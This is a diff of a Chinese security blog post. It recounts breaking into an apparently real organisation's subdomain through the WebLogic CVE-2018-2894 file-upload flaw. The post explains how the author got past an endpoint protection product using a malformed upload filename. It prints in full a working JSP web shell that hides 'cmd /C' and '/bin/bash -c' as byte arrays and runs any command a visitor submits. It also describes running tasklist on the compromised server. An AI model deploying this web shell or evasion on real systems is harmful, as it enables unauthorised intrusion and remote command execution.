@@ -322,7 +322,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  
+                  1.1k 字
                 </span>
               
 
@@ -338,7 +338,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  
+                  4 分钟
                 </span>
               
             </div>
@@ -362,18 +362,18 @@
         
           
             <h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00:前言"></a>0x00:前言</h4><p>主站搞不下来，只能看看子域名有没有什么收获，发现任意文件上传，但是有防护软件对上传文件的后缀跟内容作了检测，不能是jsp后缀，常规的jsp后门都会被杀，且只要检测到是jsp后缀跟恶意内容ip就会被防护软件拉黑，导致访问不了网站。</p>
-<h4 id="0x01-发现漏洞"><a href="#0x01-发现漏洞" class="headerlink" title="0x01:发现漏洞"></a>0x01:发现漏洞</h4><p>这个漏洞很明显，是直接开放了7001端口，这个端口第一时间想到的肯定是weblogic，看一下版本是12.2.1.3.0的,我记得版本是存在相关漏洞的。<br><img src="%E5%88%A9%E7%94%A8Java%E5%8F%8D%E5%B0%84%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87Jsp%E5%90%8E%E9%97%A8%E6%A3%80%E6%8B%BFshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/1.png" alt="1"></p>
-<p>直接使用rabbitmask表哥写的<a href="https://www.freebuf.com/column/197339.html" target="_blank" rel="noopener">weblogic++</a>检测一波发现存在CVE-2018-2894任意文件上传漏洞<br><img src="%E5%88%A9%E7%94%A8Java%E5%8F%8D%E5%B0%84%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87Jsp%E5%90%8E%E9%97%A8%E6%A3%80%E6%8B%BFshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/2.png" alt="1"></p>
+<h4 id="0x01-发现漏洞"><a href="#0x01-发现漏洞" class="headerlink" title="0x01:发现漏洞"></a>0x01:发现漏洞</h4><p>这个漏洞很明显，是直接开放了7001端口，这个端口第一时间想到的肯定是weblogic，看一下版本是12.2.1.3.0的,我记得版本是存在相关漏洞的。<br><img src="/2019/08/27/利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历/1.png" alt="1"></p>
+<p>直接使用rabbitmask表哥写的<a href="https://www.freebuf.com/column/197339.html" target="_blank" rel="noopener">weblogic++</a>检测一波发现存在CVE-2018-2894任意文件上传漏洞<br><img src="/2019/08/27/利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历/2.png" alt="1"></p>
 <p>WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为/ws_utc/begin.do，/ws_utc/config.do；漏洞的影响范围 Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3。</p>
-<p>关于CVE-2018-2894任意文件上传漏洞原理可参考云影实验室写的<a href="https://www.freebuf.com/vuls/178510.html" target="_blank" rel="noopener">WebLogic两处任意文件上传漏洞动态分析（CVE-2018-2894）</a>根据漏洞直接访问<a href="http://www.test.com/ws_utc/config.do发现确实存在。" target="_blank" rel="noopener">http://www.test.com/ws_utc/config.do发现确实存在。</a><br><img src="%E5%88%A9%E7%94%A8Java%E5%8F%8D%E5%B0%84%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87Jsp%E5%90%8E%E9%97%A8%E6%A3%80%E6%8B%BFshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/3.png" alt="1"></p>
+<p>关于CVE-2018-2894任意文件上传漏洞原理可参考云影实验室写的<a href="https://www.freebuf.com/vuls/178510.html" target="_blank" rel="noopener">WebLogic两处任意文件上传漏洞动态分析（CVE-2018-2894）</a>根据漏洞直接访问<a href="http://www.test.com/ws_utc/config.do发现确实存在。" target="_blank" rel="noopener">http://www.test.com/ws_utc/config.do发现确实存在。</a><br><img src="/2019/08/27/利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历/3.png" alt="1"></p>
 <h4 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02:漏洞利用"></a>0x02:漏洞利用</h4><p>把文件改一下，改成css这个应用静态文件具有访问权限，改了后直接点击安全选项，直接上传。</p>
 <p>上传的时候发现jsp后缀是上传不上去的，改成txt后缀可以上传成功，上床jspx也不行，当时上传的jspx是用的冰蝎自带的，还有最令人恶心的是当被防护软件检测到上传带有jsp后缀跟木马内容后直接把ip给拉黑，当我把手中的能用的ip都消耗掉后我发现还是上传不上去，由于太菜，自此陷入僵局。</p>
 <h4 id="0x03-利用Java反射和类加载机制绕过JSP后门检测"><a href="#0x03-利用Java反射和类加载机制绕过JSP后门检测" class="headerlink" title="0x03:利用Java反射和类加载机制绕过JSP后门检测"></a>0x03:利用Java反射和类加载机制绕过JSP后门检测</h4><p>在把自己所有能想到的方法尝试后，无果，最终让大佬帮看了下，直接就传上去了……逐请教是如何搞定的，发现成功上传有两点要解决，由于对文件后缀跟文件内容作了检测，那么要成功要上传，就要解决文件名不被检测，这里使用的畸形文件名去掉对于上传的文件名的双引号并在前面加上‘，要绕过文件内容的检测需要这里用到了<a href="https://xz.aliyun.com/t/2342" target="_blank" rel="noopener">利用Java反射和类加载机制绕过JSP后门检测</a>文章中的方法,把表哥写的现成的马保存为’333.jsp直接拿来用。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page pageEncoding=&quot;utf-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;title&gt;Just For Fun&lt;/title&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;H3&gt;Build By LandGrey&lt;/H3&gt;</span><br><span class="line">&lt;FORM METHOD=&quot;POST&quot; NAME=&quot;form&quot; ACTION=&quot;#&quot;&gt;</span><br><span class="line">    &lt;INPUT TYPE=&quot;text&quot; NAME=&quot;q&quot;&gt;</span><br><span class="line">    &lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Fly&quot;&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String op=&quot;Got Nothing&quot;;</span><br><span class="line">    String query = request.getParameter(&quot;q&quot;);</span><br><span class="line">    String fileSeparator = String.valueOf(java.io.File.separatorChar);</span><br><span class="line">    Boolean isWin;</span><br><span class="line">    if(fileSeparator.equals(&quot;\\&quot;))&#123;</span><br><span class="line">        isWin = true;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        isWin = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (query != null) &#123;</span><br><span class="line">        ProcessBuilder pb;</span><br><span class="line">        if(isWin) &#123;</span><br><span class="line">            pb = new ProcessBuilder(new String(new byte[]&#123;99, 109, 100&#125;), new String(new byte[]&#123;47, 67&#125;), query);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            pb = new ProcessBuilder(new String(new byte[]&#123;47, 98, 105, 110, 47, 98, 97, 115, 104&#125;), new String(new byte[]&#123;45, 99&#125;), query);</span><br><span class="line">        &#125;</span><br><span class="line">        Process process = pb.start();</span><br><span class="line">        Scanner sc = new Scanner(process.getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">        op = sc.hasNext() ? sc.next() : op;</span><br><span class="line">        sc.close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;PRE&gt;</span><br><span class="line">    &lt;%= op %&gt;&gt;</span><br><span class="line">&lt;/PRE&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
 
-<p>再次上传,访问之，发现成功返回,由于没有可用的ip了，直接用手机访问的…….<br><img src="%E5%88%A9%E7%94%A8Java%E5%8F%8D%E5%B0%84%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87Jsp%E5%90%8E%E9%97%A8%E6%A3%80%E6%8B%BFshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/4.png" alt="1"></p>
+<p>再次上传,访问之，发现成功返回,由于没有可用的ip了，直接用手机访问的…….<br><img src="/2019/08/27/利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历/4.png" alt="1"></p>
 <p>用tasklist查看运行程序，发现服务器上存在360……</p>
-<p><img src="%E5%88%A9%E7%94%A8Java%E5%8F%8D%E5%B0%84%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87Jsp%E5%90%8E%E9%97%A8%E6%A3%80%E6%8B%BFshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/5.png" alt="1"></p>
+<p><img src="/2019/08/27/利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历/5.png" alt="1"></p>
 <h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04:总结"></a>0x04:总结</h4><p>两个绕过点</p>
 <p>漏洞都是大家都懂的漏洞，主要是记录一下绕过防护软件的检测方法，其实这篇文章去年就被大佬们发出来了，要不是大哥甩给我，一直不知道可以用这个方法绕过jsp后门检测，所以多跟大师傅多接触接触，多请教请教，师傅们随便一指点就比自己瞎忙活半天有效的多。</p>
 
@@ -512,7 +512,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count"></span>
+    <span title="Site words total count">1.1k</span>
   
 </div>
 
